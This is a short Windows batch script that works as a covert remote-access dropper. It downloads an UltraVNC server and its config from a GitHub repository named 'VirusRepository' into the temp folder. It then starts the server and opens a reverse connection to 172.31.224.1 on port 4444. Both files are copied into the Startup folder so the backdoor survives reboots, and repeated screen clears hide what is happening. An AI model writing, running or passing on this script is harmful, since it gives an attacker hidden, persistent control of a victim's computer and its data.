@echo off
cd %temp%
md {BOEA-WIDJ-9832-3242-HA21-NFD2-MD34}
cd {MOEA-WIDJ-9832-3242-LS21-NFD2-MD34}
md {MOEA-WIDJ-9832-3242-LS21-NFD2-MD34}
cd {BOEA-DIDJ-9832-3242-HA21-NFD2-MD34}
md {BOEA-DIDJ-9832-3242-HA21-NFD2-MD34}
cls
cd {BOEA-WIDJ-9832-3242-HA21-NFD2-MD34}
powershell -Command "Invoke-WebRequest https://github.com/ironyumrepos/VirusRepository/raw/main/winvnc.exe -Outfile winvnc.exe"
cls
powershell -Command "Invoke-WebRequest https://github.com/ironyumrepos/VirusRepository/raw/main/ultravnc.ini -Outfile ultravnc.ini"
cls
start winvnc.exe -run
timeout /t 1 >nul
start winvnc.exe -connect 172.31.224.1::4444
cls
xcopy winvnc.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy ultravnc.ini "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
exit
